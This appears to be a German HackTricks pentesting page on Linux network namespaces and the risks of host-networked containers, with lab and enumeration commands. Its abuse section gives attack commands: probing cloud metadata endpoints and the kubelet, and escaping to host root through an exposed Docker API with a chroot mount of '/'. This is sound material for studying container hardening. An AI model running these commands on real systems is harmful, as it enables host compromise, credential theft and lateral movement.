# Netzwerk-Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Überblick

Der Netzwerk-Namespace isoliert netzwerkbezogene Ressourcen wie Interfaces, IP-Adressen, Routing-Tabellen, ARP/neighbor-Status, Firewall-Regeln, Sockets und die Inhalte von Dateien wie `/proc/net`. Deshalb kann ein container so erscheinen, als hätte er sein eigenes `eth0`, eigene lokale Routen und ein eigenes Loopback-Gerät, ohne den tatsächlichen Netzwerkstack des Hosts zu besitzen.

Aus Sicht der Sicherheit ist das wichtig, weil Netzwerkisolation weit mehr ist als nur Port-Bindung. Ein privater Netzwerk-Namespace begrenzt, was die Workload direkt beobachten oder neu konfigurieren kann. Wird dieser Namespace jedoch mit dem Host geteilt, kann der container plötzlich Sichtbarkeit auf hostseitige Listener, host-lokale Dienste und Netzwerksteuerpunkte erlangen, die nie für die Anwendung offengelegt werden sollten.

## Funktionsweise

Ein frisch erstellter Netzwerk-Namespace startet mit einer leeren oder nahezu leeren Netzwerkumgebung, bis Interfaces daran angehängt werden. Container-Runtimes erstellen oder verbinden dann virtuelle Interfaces, weisen Adressen zu und konfigurieren Routen, damit die Workload die erwartete Konnektivität erhält. In bridge-basierten Deployments bedeutet das meist, dass der container ein veth-gestütztes Interface sieht, das mit einer Host-Bridge verbunden ist. In Kubernetes übernehmen CNI-Plugins die entsprechende Einrichtung für die Pod-Netzwerkverbindung.

Diese Architektur erklärt, warum `--network=host` oder `hostNetwork: true` eine so drastische Änderung darstellt. Anstatt einen vorbereiteten privaten Netzwerkstack zu erhalten, tritt die Workload dem tatsächlichen Netzwerkstack des Hosts bei.

## Labor

Sie können ein nahezu leeres Netzwerk-Namespace mit:
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
Und Sie können normale und host-networked Container damit vergleichen:
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
Der Container mit Host-Netzwerk verfügt nicht mehr über seine eigene isolierte Sicht auf Sockets und Interfaces. Diese Änderung allein ist bereits erheblich, noch bevor Sie überhaupt fragen, welche capabilities der Prozess hat.

## Laufzeit

Docker und Podman erstellen normalerweise für jeden Container einen privaten network namespace, sofern nicht anders konfiguriert. Kubernetes gibt in der Regel jedem Pod seinen eigenen network namespace, der von den Containern innerhalb dieses Pods geteilt wird, aber vom Host getrennt ist. Incus/LXC-Systeme bieten ebenfalls umfangreiche auf network-namespace basierende Isolation, oft mit einer größeren Vielfalt an virtuellen Netzwerk-Setups.

Das gemeinsame Prinzip ist, dass private Vernetzung die standardmäßige Isolationsgrenze ist, während Host-Networking ein explizites Opt-out von dieser Grenze darstellt.

## Fehlkonfigurationen

Die wichtigste Fehlkonfiguration ist einfach das Teilen des Host-network namespace. Das wird manchmal aus Performance-, Low-Level-Monitoring- oder Komfortgründen gemacht, entfernt aber eine der saubersten Grenzen, die Containern zur Verfügung stehen. Host-lokale Listener werden auf direktere Weise erreichbar, nur auf localhost gebundene Dienste können zugänglich werden, und Capabilities wie `CAP_NET_ADMIN` oder `CAP_NET_RAW` werden deutlich gefährlicher, weil die damit möglichen Operationen nun auf die Netzwerkumgebung des Hosts angewendet werden.

Ein weiteres Problem ist das Übergeben von zu vielen netzwerkbezogenen capabilities, selbst wenn der network namespace privat ist. Ein privater namespace hilft zwar, macht aber raw sockets oder erweitertes Netzwerk-Management nicht harmlos.

In Kubernetes verändert `hostNetwork: true` außerdem, wie viel Vertrauen Sie in die Pod-level Netzwerksegmentierung setzen können. Kubernetes dokumentiert, dass viele network plugins den Verkehr von `hostNetwork` Pods für `podSelector` / `namespaceSelector` Matching nicht korrekt unterscheiden können und ihn deshalb als normalen node-Verkehr behandeln. Aus Angreiferperspektive bedeutet das, dass ein kompromittiertes `hostNetwork`-Workload oft eher als node-level Netzwerk-Fuß in der Tür betrachtet werden sollte statt als ein normaler Pod, der weiterhin den gleichen Policy-Annahmen wie Overlay-Network-Workloads unterliegt.

## Missbrauch

In schwach isolierten Umgebungen können Angreifer host-Listener inspizieren, Management-Endpunkte erreichen, die nur an loopback gebunden sind, Traffic sniffen oder stören — je nach genauem Capability-Set und Umgebung — oder Routing- und Firewall-Zustand neu konfigurieren, wenn `CAP_NET_ADMIN` vorhanden ist. In einem Cluster kann das seitliche Bewegung (lateral movement) und Control-Plane-Aufklärung ebenfalls erleichtern.

Wenn Sie Host-Networking vermuten, beginnen Sie damit zu überprüfen, ob die sichtbaren Interfaces und Listener zum Host gehören und nicht zu einem isolierten Container-Netzwerk:
```bash
ip addr
ip route
ss -lntup | head -n 50
```
Nur per Loopback erreichbare Dienste sind oft die erste interessante Entdeckung:
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
Wenn Netzwerkfähigkeiten vorhanden sind, prüfen Sie, ob der Workload den sichtbaren Stack inspizieren oder verändern kann:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
Auf modernen Kernels kann host networking zusammen mit `CAP_NET_ADMIN` den Paketpfad über einfache `iptables` / `nftables`-Änderungen hinaus offenlegen. `tc` qdiscs und filters sind ebenfalls namespace-scoped, sodass sie in einem gemeinsam genutzten host network namespace auf die host interfaces wirken, die der container sehen kann. Wenn zusätzlich `CAP_BPF` vorhanden ist, werden netzwerkbezogene eBPF-Programme wie TC- und XDP-Loader ebenfalls relevant:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw|cap_bpf'
for i in $(ls /sys/class/net 2>/dev/null); do
echo "== $i =="
tc qdisc show dev "$i" 2>/dev/null
tc filter show dev "$i" ingress 2>/dev/null
tc filter show dev "$i" egress 2>/dev/null
done
bpftool net 2>/dev/null
```
Das ist wichtig, weil ein Angreifer in der Lage sein könnte, den Datenverkehr auf Ebene der Host-Schnittstelle zu spiegeln, umzuleiten, zu formen oder zu verwerfen und nicht nur Firewall-Regeln umzuschreiben. In einem privaten Network-Namespace sind diese Aktionen auf die Sicht des Containers beschränkt; in einem geteilten Host-Namespace beeinträchtigen sie den Host.

In Cluster- oder Cloud-Umgebungen rechtfertigt Host-Networking außerdem schnelle lokale recon von Metadaten und control-plane-nahen Diensten:
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
### Vollständiges Beispiel: Host-Netzwerk + lokaler Runtime / Kubelet-Zugriff

Host-Netzwerk gewährt nicht automatisch host root, stellt jedoch häufig Dienste bereit, die bewusst nur vom Node selbst erreichbar sind. Wenn einer dieser Dienste schwach geschützt ist, wird das Host-Netzwerk zu einem direkten privilege-escalation path.

Docker API on localhost:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Kubelet auf localhost:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
Auswirkungen:

- direkte Kompromittierung des Hosts, wenn eine lokale Runtime-API ohne ausreichenden Schutz exponiert ist
- Cluster-Aufklärung oder laterale Bewegung, wenn kubelet oder lokale Agents erreichbar sind
- Manipulation des Datenverkehrs oder Denial-of-Service, wenn kombiniert mit `CAP_NET_ADMIN`

## Prüfungen

Ziel dieser Prüfungen ist es herauszufinden, ob der Prozess über einen privaten Netzwerkstack verfügt, welche Routen und Listener sichtbar sind und ob die Netzwerkansicht bereits host-ähnlich aussieht, bevor Sie überhaupt Berechtigungen testen.
```bash
readlink /proc/self/ns/net   # Current network namespace identifier
readlink /proc/1/ns/net      # Compare with PID 1 in the current container / pod
lsns -t net 2>/dev/null      # Reachable network namespaces from this view
ip netns identify $$ 2>/dev/null
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
```
Was hier interessant ist:

- If `/proc/self/ns/net` and `/proc/1/ns/net` already look host-like, the container may be sharing the host network namespace or another non-private namespace.
- `lsns -t net` and `ip netns identify` sind nützlich, wenn die Shell sich bereits in einem benannten oder persistenten Namespace befindet und Sie es mit `/run/netns`-Objekten von der Host-Seite korrelieren wollen.
- `ss -lntup` ist besonders wertvoll, weil es nur auf Loopback hörende Listener und lokale Management-Endpunkte offenlegt.
- Routes, interface names, firewall context, `tc` state, and eBPF attachments werden deutlich wichtiger, wenn `CAP_NET_ADMIN`, `CAP_NET_RAW`, oder `CAP_BPF` vorhanden sind.
- In Kubernetes kann eine fehlgeschlagene Service-Namensauflösung eines `hostNetwork` Pod einfach bedeuten, dass der Pod nicht `dnsPolicy: ClusterFirstWithHostNet` verwendet — nicht, dass der Service fehlt.

Beim Überprüfen eines container sollten Sie das Netzwerk-Namespace stets zusammen mit dem Capability-Set bewerten. Host networking plus starke Netzwerk-Capabilities ist eine völlig andere Haltung als bridge networking plus ein schmales Default-Capability-Set.

## References

- [Kubernetes NetworkPolicy and `hostNetwork` caveats](https://kubernetes.io/docs/concepts/services-networking/network-policies/)
- [eBPF token and capability requirements for network-related eBPF programs](https://docs.ebpf.io/linux/concepts/token/)
{{#include ../../../../../banners/hacktricks-training.md}}
